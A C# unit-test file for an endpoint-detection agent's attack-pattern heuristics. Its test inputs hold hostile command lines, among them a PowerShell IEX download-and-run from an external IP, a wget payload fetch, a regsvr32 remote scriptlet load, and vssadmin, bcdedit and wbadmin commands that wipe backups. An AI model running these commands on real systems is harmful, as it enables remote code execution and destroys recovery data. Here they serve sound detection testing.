using Phalanx.Cockpit.Agent;
using Xunit;

namespace Phalanx.Agent.Tests;

[Trait("Category", "Unit")]
public class AttackPatternHeuristicsTests
{
    [Theory]
    [InlineData("winword.exe (PID: 1234)", true)]
    [InlineData("excel.exe", true)]
    [InlineData("msedge.exe (PID: 5678)", true)]
    [InlineData("chrome.exe", true)]
    [InlineData("explorer.exe (PID: 1000)", false)]
    [InlineData("services.exe", false)]
    public void IsSuspiciousParent_IdentifiesOfficeAndBrowserParents(string rootCause, bool expected)
    {
        bool actual = AttackPatternHeuristics.IsSuspiciousParent(rootCause);
        Assert.Equal(expected, actual);
    }

    [Theory]
    [InlineData("powershell.exe -w hidden -enc JABj...", "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/p')", true)]
    [InlineData("curl.exe http://127.0.0.1:8080/health", null, false)]
    [InlineData("powershell.exe -Command Get-Process", null, false)]
    [InlineData("cmd.exe /c wget http://malicious.com/payload.exe", null, true)]
    public void HasInlineC2Pattern_DetectsC2AndExcludesLoopback(string cmdLine, string? decoded, bool expected)
    {
        bool actual = AttackPatternHeuristics.HasInlineC2Pattern(decoded, cmdLine);
        Assert.Equal(expected, actual);
    }

    [Theory]
    [InlineData("vssadmin.exe delete shadows /all /quiet", "vssadmin.exe", true)]
    [InlineData("bcdedit.exe /set {default} recoveryenabled No", "bcdedit.exe", true)]
    [InlineData("wbadmin.exe delete catalog -quiet", "wbadmin.exe", true)]
    [InlineData("notepad.exe C:\\test.txt", "notepad.exe", false)]
    public void IsRansomwareDestructiveCommand_IdentifiesShadowCopyDeletion(string cmdLine, string imageName, bool expected)
    {
        bool actual = AttackPatternHeuristics.IsRansomwareDestructiveCommand(cmdLine, imageName);
        Assert.Equal(expected, actual);
    }

    [Fact]
    public void IsKnownInternalOrTrusted_IdentifiesCorporateDomainAndLoopback()
    {
        bool isTrusted = AttackPatternHeuristics.IsKnownInternalOrTrusted(
            "Get-Service | Where-Object {$_.Status -eq 'Running'}",
            "powershell.exe -NoProfile -Command \"Get-Service\"",
            "127.0.0.1");

        Assert.True(isTrusted);
    }

    [Fact]
    public void ExtractTargetFilePath_ExtractsAbsoluteWindowsPath()
    {
        string cmd = "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllRegisterServer";
        string? path = AttackPatternHeuristics.ExtractTargetFilePath(null, cmd);

        Assert.Equal(@"C:\Windows\Temp\payload.dll", path);
    }

    [Theory]
    [InlineData("regsvr32.exe /s /n /u /i:http://185.220.101.5/test.sct scrobj.dll", null)] // 원격 URL은 제외
    [InlineData("regsvr32.exe /s /u /i:\"HKLM\\Software\\Classes\\CLSID\\{12345}\" scrobj.dll", @"HKLM\Software\Classes\CLSID\{12345}")]
    [InlineData("cmd.exe /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run")]
    public void ExtractTargetRegistryKey_ExtractsRegistryPathCorrectly(string cmdLine, string? expected)
    {
        string? actual = AttackPatternHeuristics.ExtractTargetRegistryKey(null, cmdLine);
        Assert.Equal(expected, actual);
    }
}
